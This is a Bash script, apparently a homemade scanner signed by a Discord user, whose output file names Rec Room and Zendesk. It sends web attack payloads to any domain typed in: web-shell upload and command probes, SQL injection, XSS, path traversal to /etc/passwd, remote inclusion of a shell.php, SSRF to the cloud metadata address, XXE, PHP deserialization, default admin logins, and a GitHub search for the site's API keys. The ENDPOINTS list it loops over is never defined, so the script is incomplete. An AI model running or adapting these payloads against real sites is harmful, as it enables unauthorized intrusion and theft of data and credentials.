#!/bin/bash

OUTPUT_FILE="recroom_zendesk_full_config_test_results.txt"

log_message() {
    echo "$1" >> $OUTPUT_FILE
}

test_endpoint() {
    local endpoint=$1
    log_message "Testing endpoint: $endpoint"
    echo "Testing endpoint: $endpoint"

    start_time=$(date +%s)

    curl -s -F "file=@test.php" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?cmd=ls" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s -d "data=O:8:\"Exploit\":0:{}" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint/api/v1/data" >> $OUTPUT_FILE 2>&1
    nc -zv "$DOMAIN" 80 443 >> $OUTPUT_FILE 2>&1
    curl -s "https://github.com/search?q=$DOMAIN+api+key" >> $OUTPUT_FILE 2>&1

    for param in "author" "tag" "month" "view" "format=json" "format=page-context" "format=main-content" "format=json-pretty" "format=ical" "reversePaginate"; do
        curl -s "$DOMAIN$endpoint?$param=test" >> $OUTPUT_FILE 2>&1
    done

    curl -s "$DOMAIN$endpoint?id=1' OR '1'='1" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?q=<script>alert(1)</script>" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=http://example.com/shell.php" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?url=http://169.254.169.254/" >> $OUTPUT_FILE 2>&1
    curl -s -d "@xxe_payload.xml" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s -X POST -d "csrf_token=test&action=delete" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1
    curl -s -d "code=system('ls')" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    for id in 1 2; do
        curl -s "$DOMAIN$endpoint?id=$id" >> $OUTPUT_FILE 2>&1
    done

    curl -s -d "username=admin&password=admin" "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1
    curl -s "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Rate Limiting for $endpoint:"
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1
    curl -s -X POST "$DOMAIN$endpoint" -d "username=admin&password=admin" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Session Management for $endpoint:"
    curl -s -I "$DOMAIN$endpoint" | grep -i "Set-Cookie" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Allowed HTTP Methods for $endpoint:"
    curl -s -X OPTIONS "$DOMAIN$endpoint" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Directory Listing for $endpoint:"
    curl -s "$DOMAIN$endpoint/" >> $OUTPUT_FILE 2>&1

    log_message "Checking for Content Security Policy for $endpoint:"
    curl -s -I "$DOMAIN$endpoint" | grep -i "Content-Security-Policy" >> $OUTPUT_FILE 2>&1

    end_time=$(date +%s)
    elapsed_time=$((end_time - start_time))
    echo "Finished testing endpoint: $endpoint in $elapsed_time seconds"
}

echo "Enter the domain you want to test (e.g., https://example.com):"
read DOMAIN

total_endpoints=${#ENDPOINTS[@]}
for ((i=0; i<total_endpoints; i++)); do
    test_endpoint "${ENDPOINTS[i]}"
    remaining=$((total_endpoints - i - 1))
    echo "Remaining endpoints: $remaining"
    echo "Estimated time left: $((remaining * 5)) seconds"
    echo "Made By iNukedYou on Discord"
done

log_message "Testing completed."
